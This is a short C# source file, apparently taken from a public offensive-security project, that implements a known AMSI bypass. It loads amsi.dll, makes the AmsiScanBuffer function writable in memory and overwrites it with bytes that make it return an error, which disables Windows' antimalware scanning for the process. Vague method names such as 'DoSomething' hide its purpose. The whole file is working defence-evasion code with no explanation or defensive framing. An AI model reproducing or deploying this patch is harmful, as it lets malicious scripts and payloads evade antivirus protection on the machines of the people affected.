using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace AmsiBypass
{
    /// <summary>
    /// "Stolen" from @_RastaMouse: https://github.com/rasta-mouse/AmsiScanBufferBypass
    /// </summary>
    public class Amsi
    {

        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void DontDoSomething()
        {
            if (IntPtr.Size != 4)
                DoSomething(x64);
            else
                DoSomething(x86);
        }

        private static void DoSomething(byte[] patch)
        {
            try
            {
                var lib = Win32.LoadLibrary("amsi.dll");
                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
